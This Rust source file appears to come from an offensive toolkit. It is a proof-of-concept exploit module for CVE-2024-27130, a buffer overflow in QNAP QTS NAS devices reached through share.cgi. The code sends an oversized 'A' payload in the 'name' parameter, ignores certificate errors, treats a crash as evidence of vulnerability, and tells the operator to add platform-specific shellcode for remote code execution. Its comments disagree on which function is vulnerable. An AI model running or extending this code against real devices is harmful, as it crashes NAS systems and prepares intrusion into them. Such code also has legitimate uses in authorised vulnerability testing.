use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};
use urlencoding;

/// QNAP QTS NAS Buffer Overflow RCE (CVE-2024-27130)
/// 
/// Exploits a stack buffer overflow in the `No_Support_ACL` function via `share.cgi`.
/// Requires a valid `ssid` parameter (obtained from a shared file link).
/// 
/// Affected: QNAP QTS, QuTScloud, QTS hero
/// Target: /cgi-bin/share.cgi

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP/URL")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    let base_url = if target_ip.contains("://") {
        target_ip.clone()
    } else {
        format!("http://{}", target_ip)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    // SSID is required - this is the session ID from a share link
    let ssid = prompt_required("SSID (from shared file link)")?;
    
    // The payload goes in the 'name' parameter
    // For PoC purposes, we'll demonstrate the vulnerability check
    // A real exploit would require crafting shellcode for the specific platform
    
    let payload_size = prompt_default("Payload size (for buffer overflow test)", "1024")?;
    let size: usize = payload_size.parse().unwrap_or(1024);
    
    println!("{} Sending overflow test payload ({} bytes)...", "[*]".blue(), size);
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(15))
        .build()?;
    
    // Construct the malicious 'name' parameter
    let overflow_payload = "A".repeat(size);
    
    // The vulnerable function is get_file_size which uses strcpy without bounds check
    let url = format!(
        "{}/cgi-bin/share.cgi?ssid={}&func=get_file_size&name={}",
        base_url.trim_end_matches('/'),
        urlencoding::encode(&ssid),
        urlencoding::encode(&overflow_payload)
    );
    
    let res = client.get(&url)
        .send()
        .await
        .context("Failed to send request")?;
        
    let status = res.status();
    let text = match res.text().await {
        Ok(t) => t,
        Err(_) => String::new(),
    };
    
    if status.is_server_error() || text.is_empty() {
        println!("{} Server error or empty response - potential crash!", "[+]".green().bold());
        println!("{} The target may be vulnerable to CVE-2024-27130.", "[VULN]".red().bold());
        println!("{} For full RCE, craft architecture-specific shellcode.", "[*]".yellow());
    } else if status.is_success() {
        println!("{} Response received (HTTP {}).", "[*]".blue(), status);
        println!("{} Response: {}", "[*]".dimmed(), text.chars().take(200).collect::<String>());
        println!("{} Target may have patched the vulnerability or SSID is invalid.", "[*]".yellow());
    } else {
        println!("{} Unexpected response: HTTP {}", "[-]".red(), status);
    }
    
    println!();
    println!("{} Note: Full exploitation requires:", "[*]".cyan());
    println!("  - Valid SSID from a shared file link");
    println!("  - Platform-specific ROP chain or shellcode");
    println!("  - QNAP QTS < 5.1.7.2770 / QuTS hero < h5.1.7.2770");

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║      QNAP QTS Buffer Overflow RCE (CVE-2024-27130)        ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
